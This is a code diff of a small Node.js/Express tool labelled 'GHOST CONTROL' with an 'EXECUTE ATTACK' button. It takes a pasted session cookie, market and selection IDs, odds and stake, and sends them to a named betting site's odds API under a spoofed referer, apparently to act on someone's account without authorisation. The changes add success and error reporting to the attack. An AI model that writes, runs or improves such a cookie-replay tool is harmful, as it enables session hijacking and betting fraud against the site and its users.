@@ -11,24 +11,22 @@ app.get('/', (req, res) => {
             <style>
                 body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
                 .card { max-width: 420px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ffcc; border-radius: 15px; box-shadow: 0 0 20px #00ffcc44; }
-                h1 { color: #00ffcc; font-size: 22px; text-shadow: 0 0 10px #00ffcc; margin-bottom: 15px; }
+                h1 { color: #00ffcc; font-size: 20px; text-shadow: 0 0 10px #00ffcc; }
                 input { width: 92%; padding: 12px; margin: 6px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 13px; }
                 .manual-grid { display: flex; gap: 8px; margin: 10px 0; }
                 .box { flex: 1; background: #000; padding: 8px; border-radius: 8px; border: 1px solid #00ffcc33; }
-                .box label { font-size: 9px; color: #666; display: block; margin-bottom: 4px; text-transform: uppercase; }
-                .box input { width: 85%; padding: 4px; font-size: 16px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; margin: 0; }
+                .box label { font-size: 9px; color: #666; display: block; margin-bottom: 4px; }
+                .box input { width: 85%; padding: 4px; font-size: 16px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; }
                 #btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; font-weight: bold; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 15px; }
-                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; font-size: 14px; }
+                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; font-size: 14px; min-height: 20px; }
                 #timer { font-size: 35px; color: #ff4d4d; font-weight: bold; display: none; }
-                .api-input { border-color: #ffcc0066; color: #ffcc00; font-size: 11px; }
             </style>
         </head>
         <body>
             <div class="card">
-                <h1>🚀 GHOST CONTROL v11.7</h1>
-                
+                <h1>🚀 GHOST CONTROL v11.7.1</h1>
                 <input id="c" placeholder="SESSION COOKIE">
-                <input id="api" class="api-input" placeholder="MANUAL API URL (OPTIONAL)">
+                <input id="api" placeholder="MANUAL API URL (OPTIONAL)">
                 
                 <div class="manual-grid">
                     <input id="m" placeholder="MARKET ID" style="width:48%">
@@ -36,20 +34,13 @@ app.get('/', (req, res) => {
                 </div>
 
                 <div class="manual-grid">
-                    <div class="box">
-                        <label>ODDS</label>
-                        <input id="p" type="number" value="100">
-                    </div>
-                    <div class="box">
-                        <label>STAKE</label>
-                        <input id="stk" type="number" value="500">
-                    </div>
+                    <div class="box"><label>ODDS</label><input id="p" type="number" value="100"></div>
+                    <div class="box"><label>STAKE</label><input id="stk" type="number" value="500"></div>
                 </div>
 
                 <div id="status">SYSTEM READY</div>
                 <div id="timer">11s</div>
-
-                <button id="btn" onclick="run()">⚡ EXECUTE GHOST ATTACK</button>
+                <button id="btn" onclick="run()">⚡ EXECUTE ATTACK</button>
             </div>
 
             <script>
@@ -60,27 +51,37 @@ app.get('/', (req, res) => {
                     const p = document.getElementById('p').value;
                     const stk = document.getElementById('stk').value;
                     const api = document.getElementById('api').value;
-                    
-                    if(!m || !s) return alert("Market/Selection ID zaruri hai!");
 
-                    const btn = document.getElementById('btn');
-                    btn.disabled = true; btn.style.background = "#222";
+                    if(!m || !s || !c) return alert("Bhai, Cookie aur IDs toh dalo!");
+
+                    document.getElementById('btn').disabled = true;
                     document.getElementById('status').innerText = "ATTACKING...";
                     document.getElementById('timer').style.display = "block";
 
                     try {
-                        await fetch('/execute', {
+                        const response = await fetch('/execute', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({m, s, c, p, stk, api})
                         });
-                        document.getElementById('status').innerText = "PACKETS SENT!";
-                    } catch(e) { document.getElementById('status').innerText = "FAILED!"; }
+                        const data = await response.json();
+                        
+                        if(data.success) {
+                            document.getElementById('status').innerText = "✅ ATTACK SUCCESSFUL!";
+                            document.getElementById('status').style.color = "#00ff00";
+                        } else {
+                            document.getElementById('status').innerText = "❌ ERROR: " + data.message;
+                            document.getElementById('status').style.color = "#ff4d4d";
+                        }
+                    } catch(e) {
+                        document.getElementById('status').innerText = "❌ FAILED: SERVER OFFLINE";
+                        document.getElementById('status').style.color = "#ff4d4d";
+                    }
 
-                    let time = 11;
+                    let t = 11;
                     let clock = setInterval(() => {
-                        time--; document.getElementById('timer').innerText = time + "s";
-                        if(time <= 0) { clearInterval(clock); location.reload(); }
+                        t--; document.getElementById('timer').innerText = t + "s";
+                        if(t <= 0) { clearInterval(clock); location.reload(); }
                     }, 1000);
                 }
             </script>
@@ -92,16 +93,27 @@ app.get('/', (req, res) => {
 app.post('/execute', async (req, res) => {
     try {
         const { m, s, c, p, stk, api } = req.body;
-        // Agar manual API hai toh wo lo, warna default
         let target = api || "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + m + "/" + s;
         
-        await axios.get(target, {
-            headers: { 'cookie': c || '', 'referer': 'https://wizardnew.com/' },
+        const result = await axios.get(target, {
+            headers: { 'cookie': c, 'referer': 'https://wizardnew.com/' },
             params: { odds: p, stake: stk },
-            timeout: 5000
+            timeout: 6000
         });
-        res.json({ s: 1 });
-    } catch (e) { res.json({ s: 0 }); }
+
+        // Agar axios ne 200 OK diya toh success
+        res.json({ success: true });
+
+    } catch (e) {
+        let msg = "Invalid Request";
+        if (e.response) {
+            // Agar site ne koi error code diya toh wo yahan aayega
+            msg = "Site Rejected (Code: " + e.response.status + ")";
+        } else if (e.code === 'ECONNABORTED') {
+            msg = "Timeout (Site Slow)";
+        }
+        res.json({ success: false, message: msg });
+    }
 });
 
 app.listen(process.env.PORT || 8080);
